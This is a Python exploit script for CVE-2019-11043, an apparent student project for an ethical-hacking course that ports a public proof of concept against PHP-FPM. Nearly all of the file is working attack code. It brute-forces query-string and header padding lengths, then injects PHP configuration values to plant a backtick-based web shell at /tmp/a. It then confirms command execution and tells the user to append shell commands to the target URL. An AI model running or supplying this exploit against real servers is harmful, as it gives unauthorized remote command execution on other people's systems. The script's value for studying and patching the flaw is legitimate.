"""
CVE-2019-11043 Remote Code Execution on PHP-FPM
See https://github.com/neex/phuip-fpizdam for the original Go implementation.

Sam Lindemer 2020, FEP3370 Advanced Ethical Hacking
"""

import sys, time
from http import client
from urllib.parse import urlparse, quote_plus

# vulnerability detection phase tuning
pos_offset      = 34
retries         = 50
min_qsl         = 1500
max_qsl         = 1950
qsl_step        = 5
max_pad_len     = 256
user_agent      = "Mozilla/5.0"

# path used to trigger bug in the detection phase
breaker_path    = "/KTH\nAdvancedEthicalHacking.php"

# target to overwrite in detection phase
detect_enabler  = "session.auto_start=1"
detect_disabler = "session.auto_start=0"

# targets to overwrite in the attack phase 
attack_chain  = [
	"short_open_tag=1",
	"html_errors=0",
	"include_path=/tmp",
	"auto_prepend_file=a",
	"log_errors=1",
	"error_reporting=2",
	"error_log=/tmp/a",
	"extension_dir=\"<?=`\"",
	"extension=\"$_GET[a]`?>\""
        ]

# payloads for the exploitation phase
check_command = "a=/bin/sh+-c+'which+which'&" 
check_pattern = "/bin/which"
check_cleanup = ";echo '<?php echo `$_GET[a]`;return;?>'>/tmp/a;which which"

'''
This is a wrapper around Python's HTTP client library for automating detection
and exploitation of the vulnerability. 
'''
class Requester:

    def __init__(self, resource):
        self.url = urlparse(resource)
        self.conn = client.HTTPConnection(self.url.netloc, timeout=30)

    '''
    This method sends requests in the following format, with the number of Qs
    determined by the query string length (QSL) argument and the number of Xs
    determiend by the pad argument.

        HTTP GET /<self.url.path>/<pathinfo>?QQQQQQQQQQQQQQQ...
        User-Agent: Mozilla/5.0
        Padding: XXXXXXXXXXXXXXXXXXXXXXXX...
        Ebut: padding

    The read flag can be disabled to return the un-parsed HTTP response. The
    response MUST BE parsed before sending another request. 
    '''
    def request(self, pathinfo, qsl, pad, prefix="", read=True):

        # resource path must begin with a '/'
        if pathinfo[0] != '/': pathinfo = '/' + pathinfo

        # format the query string with escape characters (spaces replaced with +)
        path = quote_plus(self.url.path + pathinfo, safe="=;/+=&'")

        # the length change in QSL after URL formatting must be even
        qsl_delta = len(path) - len(pathinfo) - len(quote_plus(self.url.path, safe="=;/+=&'"))
        assert(qsl_delta % 2 == 0)

        # check that the query string length is long enough 
        qsl_prime = int(qsl - qsl_delta / 2 - len(prefix))
        assert(qsl_prime >= 0)

        self.conn.putrequest("GET", path + '?' + prefix + 'Q' * qsl_prime, \
                skip_accept_encoding=True)
        self.conn.putheader("User-Agent", user_agent)
        self.conn.putheader("Padding", 'X' * pad)
        self.conn.putheader("Ebut", "more padding")
        self.conn.endheaders()
        resp = self.conn.getresponse()
        if read: resp.read()
        return resp

def make_path_info(php_value):
    pathinfo = "/PHP_VALUE\n" + php_value
    assert(len(pathinfo) <= pos_offset)
    return pathinfo + ';' * (pos_offset - len(pathinfo))

'''
The detection step for this exploit involves sending many HTTP GET requests with
varying query string lengths appended to a path with a linebreak in it. The
first request is used as a baseline; when a QSL incurs a different response code
than the baseline, it is stored as a candidate to be used in the exploit.
'''
def detect(requester):

    # check the baseline response code for requests in this format
    base_resp = requester.request("/path\ninfo.php", 1500, 1)
    base_resp.read()

    # find QSLs that return a different response code
    qsl_candidates = []
    for qsl in range(min_qsl, max_qsl, qsl_step):
        resp = requester.request(breaker_path, qsl, 1)
        if resp.status != base_resp.status:
            qsl_candidates.append(qsl)
    assert(len(qsl_candidates) > 0)

    # extend the list of candidates with neighboring QSLs
    qsl_extended = []
    for qsl in qsl_candidates:
        for x in range(-10, qsl_step, qsl_step):
            qsl_extended.append(qsl + x)
    print("Found query string length candidates: " + str(qsl_extended))

    # repeat above process for pad length; attempt to overwrite PHP configuration
    pathinfo = make_path_info(detect_enabler)
    pad_candidates = range(max_pad_len)
    for i in range(retries):
        for qsl in qsl_extended:
            for pad in pad_candidates:
                resp = requester.request(pathinfo, qsl, pad)

                # this check will return true if the PHP overwrite suceeded
                if "PHPSESSID" in resp.getheader("set-cookie", default=""):
                    print("Found attack parameters: qsl=" + str(qsl) + ", pad=" + str(pad))

                    # undo the overwrite; it was only needed for detection
                    for j in range(retries):
                        pathinfo = make_path_info(detect_disabler)
                        requester.request(pathinfo, qsl, pad)
                    return (qsl, pad)

    # no working combination of QSL and pad found
    raise Exception("Target not vulnerable.")

'''
The attack itself involves using the parameters discovered in the detect phase
in order to inject a PHP script that executes arbitrary shell code. The script
will immediately execute the command "which which", which actually returns
/bin/which in the HTTP response if executed succesfully.
'''
def attack(requester, qsl, pad):

    print("Attempting remote code execution... ", end="")
    while True:
       for php_value in attack_chain:
           pathinfo = make_path_info(php_value)
           resp = requester.request(pathinfo, qsl, pad, prefix=check_command, read=False)
           if check_pattern in str(resp.read()):
               print("success!");
               return

'''
Delete the /tmp/a file created in the previous step, using the "which which"
technique to detect success as before.
'''
def cleanup(requester, qsl, pad):

    print("Attempting cleanup of /tmp/a... ", end="")
    while True:
        resp = requester.request('/', qsl, pad,
                prefix="a=" + quote_plus(check_cleanup, safe='') + '&', read=False)
        if check_pattern in str(resp.read()):
            print("success!");
            return

if __name__ == "__main__":

    if len(sys.argv) != 2:
        print("Usage: exploit.py <address>:<port>/<resource>.php")
        exit()

    requester = Requester(sys.argv[1]) 
    qsl, pad = detect(requester)
    attack(requester, qsl, pad)
    cleanup(requester, qsl, pad)

    print("Attack successful. Append shell commands to: " + sys.argv[1] + "?a=")
